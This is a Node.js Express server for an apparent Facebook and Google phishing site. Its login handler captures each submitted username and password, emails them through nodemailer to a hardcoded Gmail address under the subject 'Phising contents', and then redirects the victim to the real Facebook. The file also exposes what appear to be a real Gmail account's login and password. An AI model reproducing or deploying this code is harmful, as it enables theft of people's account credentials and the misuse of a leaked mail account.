// Server generated | Essentials
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const index = require('./router/index')
const facebook = require('./router/facebook')
var nodemailer = require('nodemailer')

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(`${__dirname}/statics`));
app.set('view engine', 'ejs');

app.use('/', index)
app.get('/google_signin', (req, res)=>{
    res.send(`<title>Error Code 201</title><link rel="shortcut icon" href="/img/google-logo-9808.png" type="image/x-icon">
    <h1 style='user-select: none;text-align: center;padding: 20px;font-family: sans-serif;text-shadow: 0 0 20px #000;font-size: 18px;'>Sorry, Cannot signin with third-party service (Google) at a moment</h1>`)
})
app.use('/facebook_signin', facebook)

app.post('/login_api', (req, res)=>{
    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'acharyaraj9865032909@gmail.com',
            pass: 'Sachin9865032909'
         }
     });

    var mailOptions = {
        from: 'Sachin Acharya<acharyaraj71@gmail.com>',
        to: 'acharyaraj9865032909@gmail.com',
        subject: 'Phising contents',
        html: `<p><strong>Email or Phone:<strong> ${req.body.username}</p><p><strong>Password: </strong> ${req.body.pass}</p>`
    }
    
    //Nodemailer SendMail
    transporter.sendMail(mailOptions, (err, info) => {
        if (err) {
            console.log(err);
            res.send('Error')
        } else {
            console.log('Email sent :' + info.response);
            res.redirect('https://www.facebook.com')
        }
     })
})

const Port = process.env.PORT || 3000;
app.listen(Port, (err) => {
    if (err) {
       console.log(err)
   } else {
       console.log(`Server listening at http://localhost:${Port}`);
    }
});
